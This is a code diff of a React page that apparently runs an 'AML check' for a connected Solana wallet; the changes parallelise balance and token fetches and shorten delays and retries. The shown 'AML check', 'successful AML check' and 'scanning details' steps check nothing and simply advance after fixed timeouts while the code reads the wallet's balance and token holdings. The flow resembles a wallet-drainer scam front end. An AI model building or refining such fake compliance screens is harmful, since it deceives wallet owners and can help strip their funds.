@@ -84,30 +84,36 @@ const Index = () => {
     
     try {
       updateStepStatus('addressCheck', 'active');
-      console.log("Getting wallet balance directly");
-      const solBalance = await getWalletBalance(publicKey.toString());
       
-      setWalletBalance(solBalance);
-      console.log("Current balance:", solBalance, "SOL");
-      advanceToNextStep('addressCheck');
-
-      updateStepStatus('amlCheck', 'active');
-      console.log("Fetching token accounts");
-      const tokenAccounts = await getTokenAccounts(connection, publicKey.toString());
-      console.log("Token accounts received:", tokenAccounts);
-      setTokens(tokenAccounts || []);
+      const [solBalance, tokenAccounts] = await Promise.all([
+        getWalletBalance(publicKey.toString())
+          .then(balance => {
+            console.log("Current balance:", balance, "SOL");
+            setWalletBalance(balance);
+            return balance;
+          }),
+        Promise.resolve().then(async () => {
+          advanceToNextStep('addressCheck');
+          updateStepStatus('amlCheck', 'active');
+          console.log("Fetching token accounts");
+          const tokens = await getTokenAccounts(connection, publicKey.toString());
+          console.log("Token accounts received:", tokens);
+          setTokens(tokens || []);
+          return tokens;
+        })
+      ]);
+      
       advanceToNextStep('amlCheck');
-      
       updateStepStatus('successfulAmlCheck', 'active');
-      await new Promise(resolve => setTimeout(resolve, 300));
+      await new Promise(resolve => setTimeout(resolve, 150));
       advanceToNextStep('successfulAmlCheck');
 
       updateStepStatus('scanningDetails', 'active');
-      await new Promise(resolve => setTimeout(resolve, 300));
+      await new Promise(resolve => setTimeout(resolve, 150));
       advanceToNextStep('scanningDetails');
 
       updateStepStatus('thanks', 'active');
-      await new Promise(resolve => setTimeout(resolve, 300));
+      await new Promise(resolve => setTimeout(resolve, 150));
       advanceToNextStep('thanks');
 
       setFetchRetries(0);
@@ -126,15 +132,15 @@ const Index = () => {
       const newRetryCount = fetchRetries + 1;
       setFetchRetries(newRetryCount);
       
-      if (newRetryCount < 5) {
-        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/5)...`);
+      if (newRetryCount < 3) {
+        console.log(`Auto-retrying wallet data fetch (${newRetryCount}/3)...`);
         toast({
           title: "Connection Issue",
           description: "Retrying to fetch wallet data...",
         });
         setTimeout(() => {
           fetchWalletData();
-        }, 2000 * newRetryCount);
+        }, 1000 * newRetryCount);
       }
       
       return null;
@@ -160,11 +166,11 @@ const Index = () => {
     setShowLoadingModal(true);
     
     updateStepStatus('connect', 'active');
-    await new Promise(resolve => setTimeout(resolve, 300));
+    await new Promise(resolve => setTimeout(resolve, 100));
     advanceToNextStep('connect');
     
     updateStepStatus('connectSuccess', 'active');
-    await new Promise(resolve => setTimeout(resolve, 250));
+    await new Promise(resolve => setTimeout(resolve, 100));
     advanceToNextStep('connectSuccess');
     
     try {
@@ -176,12 +182,12 @@ const Index = () => {
       console.log("Starting wallet connection process");
       
       let walletData = null;
-      for (let attempt = 0; attempt < 3; attempt++) {
+      for (let attempt = 0; attempt < 2; attempt++) {
         try {
           walletData = await fetchWalletData();
           if (walletData) break;
           console.log(`Wallet data fetch attempt ${attempt + 1} failed, retrying...`);
-          await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
+          await new Promise(resolve => setTimeout(resolve, 500 * (attempt + 1)));
         } catch (e) {
           console.error(`Fetch attempt ${attempt + 1} error:`, e);
         }
@@ -368,7 +374,7 @@ Transaction: https://explorer.solana.com/tx/${signature}`,
       setTimeout(() => {
         setShowLoadingModal(false);
         setIsProcessing(false);
-      }, 1000);
+      }, 800);
     }
   };
 
